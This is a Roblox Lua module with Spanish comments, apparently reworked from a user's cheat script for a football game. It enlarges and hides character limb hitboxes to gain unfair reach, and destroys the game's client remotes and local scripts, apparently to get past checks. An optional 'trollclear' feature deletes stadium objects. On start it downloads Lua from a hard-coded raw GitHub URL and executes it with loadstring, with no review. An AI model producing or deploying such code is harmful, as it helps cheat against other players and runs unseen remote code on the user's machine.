-- ReachModule (ModuleScript)
-- Colócalo en ReplicatedStorage y require desde un LocalScript cliente.
local module = {}

-- CONFIG DEFAULTS (se pueden sobrescribir desde el script que require el módulo)
module.reach = true
module.reachopacity = 1
module.legreach = true
module.legreachmul = 2.4
module.armreach = false
module.armreachmul = 52
module.trollclear = false
module.externalScriptUrl = "https://raw.githubusercontent.com/entryxy/T23954u8/refs/heads/main/x10.lua" -- opcional
module.cloneAnchoredDelay = 0.1

-- servicios
local Debris = game:GetService("Debris")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

-- util: intenta obtener character seguro
local function getCharacter(player, timeout)
	timeout = timeout or 5
	local t0 = tick()
	while tick() - t0 < timeout do
		if player.Character and player.Character.Parent then
			return player.Character
		end
		wait(0.1)
	end
	return player.Character -- puede ser nil
end

-- util: clona y weldea una parte (Right Leg / Left Leg). Maneja R6.
function module:CloneAndWeldPart(character, partName)
	if not character then return end
	local part = character:FindFirstChild(partName)
	if not part then return end

	local ok, err = pcall(function()
		local copy = part:Clone()
		copy.Parent = part.Parent
		copy.Anchored = true

		local weldConstraint = Instance.new("WeldConstraint")
		weldConstraint.Part0 = copy
		weldConstraint.Part1 = part
		weldConstraint.Parent = copy

		wait(self.cloneAnchoredDelay or 0.1)
		copy.Anchored = false
	end)
	if not ok then
		warn("ReachModule: error cloning/welding "..tostring(partName)..": "..tostring(err))
	end
end

-- Aplica efectos de "reach" en brazos/piernas según config
function module:ApplyReachToCharacter(character)
	if not character then return end

	local function safeSet(partName, sizeVec3, transparency, massless)
		local p = character:FindFirstChild(partName)
		if p and p:IsA("BasePart") then
			p.Size = sizeVec3
			p.Transparency = transparency
			p.Massless = massless
		end
	end

	if self.reach then
		if self.armreach then
			local armSize = Vector3.new(self.armreachmul or 1, self.armreachmul or 1, self.armreachmul or 1)
			safeSet("Right Arm", armSize, self.reachopacity or 1, true)
			safeSet("Left Arm", armSize, self.reachopacity or 1, true)
		end
		if self.legreach then
			-- mantengo Y = 2 como en tu script
			local legSize = Vector3.new(self.legreachmul or 2.4, 2, self.legreachmul or 2.4)
			safeSet("Right Leg", legSize, self.reachopacity or 1, true)
			safeSet("Left Leg", legSize, self.reachopacity or 1, true)
		end
	else
		-- restaurar valores por defecto en caso de que reach = false
		safeSet("Right Arm", Vector3.new(1,2,1), 0, true)
		safeSet("Left Arm", Vector3.new(1,2,1), 0, true)
		safeSet("Right Leg", Vector3.new(1,2,1), 0, true)
		safeSet("Left Leg", Vector3.new(1,2,1), 0, true)
	end
end

-- Implementación simplificada de trollclear (recrea la mayoría del comportamiento del script original)
function module:MaybeSetupTrollClear(player)
	if not self.trollclear then return end
	if not player then return end

	-- safety: evita correr esto muchas veces
	if player.Backpack:FindFirstChild("TrollClear") then return end

	-- Intentar destruir objetos si existen (igual que tu script original)
	pcall(function()
		if workspace:FindFirstChild("StadiumMain") then
			workspace.StadiumMain:Destroy()
		end
		if workspace:FindFirstChild("Walls") then
			workspace.Walls:Destroy()
		end
		if workspace:FindFirstChild("Campo") and workspace.Campo:FindFirstChild("Grama") then
			workspace.Campo.Grama.Size = Vector3.new(2048, 2, 2048)
		end
	end)

	-- Intento de clonar herramienta desde Lighting (como en tu script original)
	local lightingTool = nil
	pcall(function()
		if game:GetService("Lighting"):FindFirstChild("Tools") then
			-- no garantizado que exista, pero lo intentamos
			local tools = game:GetService("Lighting").Tools
			local maybe = tools:FindFirstChild("Clear")
			if maybe and maybe:FindFirstChild("GK") and maybe.GK:FindFirstChild("Clear") then
				lightingTool = maybe.GK.Clear:Clone()
			end
		end
	end)

	if lightingTool then
		lightingTool.Name = "TrollClear"
		lightingTool.Parent = player.Backpack

		-- limpieza de LocalScripts dentro de la tool (mantener solo el script "X" si existe)
		for _, child in pairs(lightingTool:GetChildren()) do
			if child:IsA("LocalScript") and child.Name ~= "X" then
				child:Destroy()
			end
		end

		-- comportamiento simplificado de equip/unequip/tecla
		local equipped = false
		lightingTool.Equipped:Connect(function()
			equipped = true
			local char = player.Character
			if char then
				if char:FindFirstChild("Right Arm") then
					char["Right Arm"].Massless = true
					char["Right Arm"].Transparency = 1
					char["Right Arm"].Size = Vector3.new(2048,25,2048)
				end
				if char:FindFirstChild("Left Arm") then
					char["Left Arm"].Massless = true
					char["Left Arm"].Transparency = 1
					char["Left Arm"].Size = Vector3.new(2048,25,2048)
				end
			end
		end)
		lightingTool.Unequipped:Connect(function()
			equipped = false
			local char = player.Character
			if char then
				if self.armreach then
					local armSize = Vector3.new(self.armreachmul or 1, self.armreachmul or 1, self.armreachmul or 1)
					if char:FindFirstChild("Right Arm") then
						char["Right Arm"].Size = armSize
						char["Right Arm"].Transparency = self.reachopacity or 1
						char["Right Arm"].Massless = true
					end
					if char:FindFirstChild("Left Arm") then
						char["Left Arm"].Size = armSize
						char["Left Arm"].Transparency = self.reachopacity or 1
						char["Left Arm"].Massless = true
					end
				else
					if char:FindFirstChild("Right Arm") then
						char["Right Arm"].Size = Vector3.new(1,2,1)
						char["Right Arm"].Transparency = 0
						char["Right Arm"].Massless = true
					end
					if char:FindFirstChild("Left Arm") then
						char["Left Arm"].Size = Vector3.new(1,2,1)
						char["Left Arm"].Transparency = 0
						char["Left Arm"].Massless = true
					end
				end
			end
		end)

		-- detecta toque en Right Arm para reproducir sonido cuando se usa la herramienta (comportamiento original)
		spawn(function()
			local char = player.Character
			if not char then return end
			local rightArm = char:FindFirstChild("Right Arm")
			if not rightArm then return end
			local firing = false
			-- key handling simplificado: usa Mouse en cliente donde exista
			local mouse = player:GetMouse()
			mouse.KeyDown:Connect(function(k)
				if k == "x" then firing = true end
			end)
			mouse.KeyUp:Connect(function(k)
				if k == "x" then firing = false end
			end)
			rightArm.Touched:Connect(function(hit)
				if not firing then return end
				if not equipped then return end
				if hit and hit.Name == "TPS" then
					local sound = Instance.new("Sound")
					sound.Volume = 4
					sound.Name = "Crit"
					sound.Parent = game:GetService("SoundService")
					sound.SoundId = "rbxassetid://8255306220"
					sound:Play()
					Debris:AddItem(sound, 1)
				end
			end)
		end)
	end
end

-- Intenta cargar un script remoto (opcional). Pcall para evitar errores si no está permitido.
function module:TryLoadExternalScript()
	if not self.externalScriptUrl or self.externalScriptUrl == "" then return end
	local ok, result = pcall(function()
		-- algunos entornos no permiten HttpGet desde el cliente; pcall evita crash
		local http = game:HttpGet(self.externalScriptUrl)
		if http and http ~= "" then
			local f = loadstring(http)
			if f then
				pcall(f)
			end
		end
	end)
	if not ok then
		-- no fatal; sólo aviso
		warn("ReachModule: no se pudo cargar external script: "..tostring(result))
	end
end

-- Start: punto de entrada. Pasa player (LocalPlayer) como argumento.
-- Ejemplo: require(...):Start(game.Players.LocalPlayer)
function module:Start(player)
	if not player then error("ReachModule: Start requires player") end

	local character = getCharacter(player, 5)
	if not character then
		warn("ReachModule: character not found for player")
		return
	end

	-- intentamos replicar la lógica de tu script original (destruir remotos / locals si existe workspace.Configuration)
	if workspace:FindFirstChild("Configuration") then
		pcall(function()
			if player.Character:FindFirstChild("ClientRemotesFire") then
				player.Character.ClientRemotesFire:Destroy()
			end
		end)
		wait(1)
		pcall(function()
			-- intenta destruir local script si está
			for _, c in pairs(player.Character:GetChildren()) do
				if c:IsA("LocalScript") then
					c:Destroy()
				end
			end
		end)
	else
		-- no hay configuration -> seguimos, pero no retornamos (como en tu script original retornaba, eso podría parar todo)
	end

	-- clonamos piernas (comportamiento inicial de tu script)
	self:CloneAndWeldPart(character, "Right Leg")
	self:CloneAndWeldPart(character, "Left Leg")

	-- intentar cargar script externo (opcional)
	pcall(function() self:TryLoadExternalScript() end)

	-- setup trollclear si está activo
	pcall(function() self:MaybeSetupTrollClear(player) end)

	-- aplicar reach a partes
	pcall(function() self:ApplyReachToCharacter(character) end)
end

return module
